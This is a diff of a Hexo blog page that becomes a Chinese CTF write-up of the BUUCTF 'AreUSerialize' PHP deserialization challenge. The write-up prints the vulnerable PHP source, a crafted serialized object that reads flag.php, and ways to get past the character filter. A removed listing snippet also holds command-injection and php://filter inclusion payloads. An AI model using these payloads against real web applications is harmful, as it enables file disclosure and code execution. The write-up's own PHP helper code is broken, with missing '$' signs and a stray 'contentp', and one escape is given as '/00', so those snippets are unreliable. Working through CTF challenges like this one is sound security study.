@@ -5,10 +5,6 @@
   <!-- SEO相关 -->
   
     
-      
-        <meta name="robots" content="noindex,follow">
-      
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -23,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Hexo</title>
+  <title>postbuu网鼎杯areunserialize - Hexo</title>
   
 
   
@@ -309,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  dock' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -385,452 +381,351 @@
         
 
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-  <section class="post-list">
+
+
+  
+  <div class="article-meta" id="top">
     
     
+    
+      <h1 class="title">
+        postbuu网鼎杯areunserialize
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jan 18, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
-        第二周学习报告
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
+      <div id="lc-pv" data-title="postbuu网鼎杯areunserialize" data-path="/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-03</time>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <a id="more"></a>
+
+<pre><code>    &lt;?php
+
+include(&quot;flag.php&quot;);
+
+ highlight_file(__FILE__);
+
+class FileHandler &#123;
+
+protected $op;
+protected $filename;
+protected $content;//类型为protected
+
+function __construct() &#123;
+    $op = &quot;1&quot;;
+    $filename = &quot;/tmp/tmpfile&quot;;//这个tmp是临时执行文件
+    $content = &quot;Hello World!&quot;;
+    $this-&gt;process();
+&#125;
+
+public function process() &#123;
+    if($this-&gt;op == &quot;1&quot;) &#123;
+        $this-&gt;write();
+    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+        $res = $this-&gt;read();
+        $this-&gt;output($res);
+    &#125; else &#123;
+        $this-&gt;output(&quot;Bad Hacker!&quot;);
+    &#125;
+&#125;
+
+private function write() &#123;
+    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
+        if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+            $this-&gt;output(&quot;Too long!&quot;);
+            die();//退出脚本，所以要使用的话要让content的长度小于100
+        &#125;
+        $res = file_put_contents($this-&gt;filename, $this-&gt;content);//res为要让content的东西写入file的文件中去
+        if($res) $this-&gt;output(&quot;Successful!&quot;);
+        else $this-&gt;output(&quot;Failed!&quot;);
+    &#125; else &#123;
+        $this-&gt;output(&quot;Failed!&quot;);
+    &#125;
+&#125;
+
+private function read() &#123;
+    $res = &quot;&quot;;
+    if(isset($this-&gt;filename)) &#123;
+        $res = file_get_contents($this-&gt;filename);//把整个文件写入字符串中
+    &#125;
+    return $res;
+&#125;
+
+private function output($s) &#123;
+    echo &quot;[Result]: &lt;br&gt;&quot;;
+    echo $s;
+&#125;
+
+function __destruct() &#123;
+    if($this-&gt;op === &quot;2&quot;)
+        $this-&gt;op = &quot;1&quot;;
+    $this-&gt;content = &quot;&quot;;
+    $this-&gt;process();
+&#125;
+
+&#125;
+
+function is_valid($s) &#123;
+for($i = 0; $i &lt; strlen($s); $i++)
+    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))//如果这个字符串的首位的ascii的值在32与125的区间里返回true
+        return false;
+return true;
+&#125;
+
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+
+$str = (string)$_GET[&#39;str&#39;];//用get的方法传入一个参数
+if(is_valid($str)) &#123;//如果它是真的反序列化str
+    $obj = unserialize($str);
+&#125;
+
+&#125;</code></pre>
+<p>先看这里<br></p>
+<pre><code> if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+$str = (string)$_GET[&#39;str&#39;];
+if(is_valid($str)) &#123;
+    $obj = unserialize($str);
+&#125;</code></pre>
+<p>用get的方法传入一个参数如果它通过了is_valid的检验，那么进行反序列化，通过检验的方法是字符串的ascii的值要在32~125之间。<br><br>因为这个类没有实例化对象，所以我们直接来到析构函数。<br></p>
+<pre><code>function __destruct() &#123;
+    if($this-&gt;op === &quot;2&quot;)
+        $this-&gt;op = &quot;1&quot;;
+    $this-&gt;content = &quot;&quot;;
+    $this-&gt;process();
+&#125;</code></pre>
+<p>如果op的值为“2”，注意这里的2是字符串型，那么讲op的值赋为“1”，if之后是content的值为“”，执行process。<br></p>
+<pre><code>        public function process() &#123;
+    if($this-&gt;op == &quot;1&quot;) &#123;
+        $this-&gt;write();
+    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+        $res = $this-&gt;read();
+        $this-&gt;output($res);
+    &#125; else &#123;
+        $this-&gt;output(&quot;Bad Hacker!&quot;);
+    &#125;
+&#125;</code></pre>
+<p>如果op为1，那么执行write，但是emm，write对解题没有帮助，所以我们要让op的值为2，进行read,然后讲read的值给res，然后来到output。<br></p>
+<pre><code>   private function read() &#123;
+    $res = &quot;&quot;;
+    if(isset($this-&gt;filename)) &#123;
+        $res = file_get_contents($this-&gt;filename);//把整个文件写入字符串中
+    &#125;
+    return $res;
+&#125;</code></pre>
+<p>read这里是说让res的值为空，检验是否设定filename这个变量，然后读取filename的内容，返回res。<br></p>
+<pre><code>     private function output($s) &#123;
+    echo &quot;[Result]: &lt;br&gt;&quot;;
+    echo $s;
+&#125;</code></pre>
+<p> 得到flag。</p>
+<p>所以我们构造。</p>
+<pre><code> &lt;?php 
+    class FileHandler&#123;protected op=2;protected filename=&#39;flag.php&#39;;protected contentp;
+      &#125;
+   $obj=new FileHandler();  echo serialize($obj);
+ ?&gt;   </code></pre>
+<p>得到<mark>O:11:”FileHandler”:3:{s:5:”%00*%00op”;i:2;s:11:”%00*%00filename”;s:8:”flag.php”;s:10:”%00*%00content”;N;}</mark>但是这没有成功，因为is_vaile都没有过去，%00的ascii值好像是0.现在要绕过这个，有两种方法。<br></p>
+<li>  
+
+<pre><code>    &lt;?php 
+    class FileHandler&#123;public op=2;public filename=&#39;flag.php&#39;;public contentp;
+      &#125;
+   $obj=new FileHandler();  echo serialize($obj);
+ ?&gt;   
+  好像是php版本7.1以上，对变量的属性的要求不严格</code></pre>
+<li>
+
+<pre><code>  O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;/00*/00op&quot;;i:2;S:11:&quot;/00*/00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;/00*/00content&quot;;N;&#125;
+  讲s改为大写，%00可写为/00用16进制绕过</code></pre>
+<p>然后·ctrl u查看页面源代码</p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/>http://ckylsy.github.io/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-18T22:23:49+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jan 18, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/02/php%E5%87%BD%E6%95%B0/">
-        php函数
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>无</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/02/php%E5%87%BD%E6%95%B0/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+          
 
-</div>
-
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-        伪协议
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>伪协议的学习</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/">
-        变量覆盖二
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>变量覆盖2</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-28</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
-        html学习报告
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>无</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-27</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/26/rce2/">
-        rce2
-      </a>
-    </h2>
-  
-  <div class='md'>
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        #前言basic rce 2
-直接构造？Rem=（&quot;ca\t f\lag&quot;）或者Rem=（&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;）就可以出来
-但是在网上看到了一个比较厉害的做法
-?Rem=include $_GET[&quot;cky&quot;] ?&gt;&amp;cky=php://filter/read=conve...
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/&title=postbuu网鼎杯areunserialize - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/&title=postbuu网鼎杯areunserialize - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/&title=postbuu网鼎杯areunserialize - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-26</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/26/rce2/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
-        变量覆盖
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>extract变量覆盖</p>
-    
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-26</time>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/'>
-            Read More
-          </a>
-        </div>
+      
+        <a class='next' href='/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/'>
+          <p class='title'>反序列学习&buu刷题的第二天,CTFshow部分题目<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>#前言以此用来记录学习反序列化的时候遇见的题目
+
+
+题目一
+
+
+题目二(buu极客大挑战php)
+打开题目，上面提示说备份网站，按照常规思路，备份网站应该是index.php.bak，但是出现了...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/">
-        常见命令汇总
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>遇到后随时补充</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-25</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/25/rce/">
-        rce
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>basic rce</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-25</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/25/rce/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/21/exec1-php/">
-        exec1,php
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>无哈哈哈哈哈哈</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-21</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/21/exec1-php/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          2 / 3
-        </p>
-        
-          <a class="next" rel="next" href="/page/3/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -840,82 +735,8 @@
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-
-  
-
-  
-    
-    
-
-  
 
   
 
@@ -931,8 +752,8 @@
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="postbuu网鼎杯areunserialize";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
